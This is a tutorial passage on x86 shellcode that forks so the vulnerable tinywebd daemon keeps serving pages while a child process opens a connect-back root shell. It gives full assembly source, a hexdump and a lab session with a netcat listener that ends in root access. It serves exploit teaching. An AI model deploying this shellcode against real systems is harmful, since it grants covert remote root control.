Now that the difficult part is figured out, we can use this technique to silently spawn a root shell
Since the shell is interactive, but we still want the process to handle web requests, we need to fork a child process
The fork() call creates a child process that is an exact copy of the parent, except that it returns 0 in the child process and the new process ID in the parent process
We want our shellcode to fork and the child process to serve up the root shell, while the parent process restores tinywebd's execution
In the shellcode below, several instructions are added to the start of loopback_shell.s
First, the fork syscall is made, and the return value is put in the EAX reguster
The next few instructions test to see if EAX is zero
If EAX is zero, we jump to child_process to spawn the shell
Otherwise, we're in the parent process, so the shellcode restores execution into tinywebd

loopback_shell_restore.s
__________________________________________________________________________________
BITS 32

  push BYTE 0x02    ; Fork is syscall #2
  pop eax
  int 0x80          ; After the fork, in child process eax == 0
  test eax, eax
  jz child_process  ; In child process spawns a shell

; In the parent process, restore tinywebd
  lea ebp, [esp+0x68]   ; Restore EBP
  push 0x08048fb7       ; Return address
  ret                   ; ret

child_process:
; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  xchg esi, eax     ; save socket FD in esi for later

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1
  mov WORD [esp+1], dx  ; overwrite the BBBB with 0000 in the previous push 
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = 0 on successful connection

;  jz success        ; if connection successful, jump down to spawn shell
;  xor eax, eax      ; otherwise, exit cleanly
;  inc eax           ; eax = 1 exit (syscall #1)
;  xor ebx, ebx      ; status = 0  (nothing to see here)
;  int 0x80

;success:
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg esi, ebx     ; put socket FD from esi into ebx (esi = 3)
  xchg ecx, esi     ; ecx = 3
  dec ecx           ; ecx starts at 2
;  xchg eax, esi     ; eax = 0x00000003  
;  push BYTE 0x2
;  pop ecx           ; ecx starts at 2
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
__________________________________________________________________________________

      The new instructions are in the first few lines
      We load up a child process with fork syscall
         The execution will continue in both parent and the child
         So, we check to see if the current program is parent or the child
               by performing bitwise & on the EAX
         If it is child, we open a loopback shell
         If it is parent, we restore the program


The following listing shows this shellcode in use
Multiple jobs are used instead of multiple terminals, so the netcat listener is sent to the background by ending the command with an ampersand (&)
After the shell connects back, the fg command brings the listener back to the foreground
The process is then suspended by hitting CTRL-Z, which returns to the BASH shell
It might be easier for us to use multiple terminals as we are following along, but job control is useful to know for those times when we don't have the luxury of multiple terminals

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm loopback_shell_restore.s
reader@hacking:~/booksrc $ hexdump -C loopback_shell_restore
00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X..t.l$hh.|
00000010 04 08 c3 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 |..jfX.1.CRj.j.|
00000020 e1 cd 80 96 6a 66 58 43 68 7f bb bb 01 66 89 54 |..jfXCh..f.T|
00000030 24 01 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 |$.fhzifS.j.QV.|
00000040 43 cd 80 87 f3 87 ce 49 b0 3f cd 80 49 79 f9 b0 |C...I.?.Iy.|
00000050 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 |.Rh//shh/bin.R.|
00000060 e2 53 89 e1 cd 80                               |.S..|
00000066

reader@hacking:~/booksrc $ ./tinywebd
Starting tiny web daemon.

reader@hacking:~/booksrc $ nc -l -p 31337 &
[1] 27279

reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell_restore 127.0.0.1
target IP: 127.0.0.1
shellcode: loopback_shell_restore (102 bytes)
fake request: "GET / HTTP/1.1\x00" (15 bytes)
[Fake Request (15 b)] [NOP (299 b)] [shellcode (102 b)] [ret addr (128 b)]
localhost [127.0.0.1] 80 (www) open

reader@hacking:~/booksrc $ fg
nc -l -p 31337
whoami
root

[1]+ Stopped                  nc -l -p 31337

reader@hacking:~/booksrc $ ./webserver_id 127.0.0.1
The web server for 127.0.0.1 is Tiny webserver

reader@hacking:~/booksrc $ fg
nc -l -p 31337
whoami
root
__________________________________________________________________________________

With this shellcode, the connect-back root shell is maintained by a separate child process, while the parent process continues to serve web content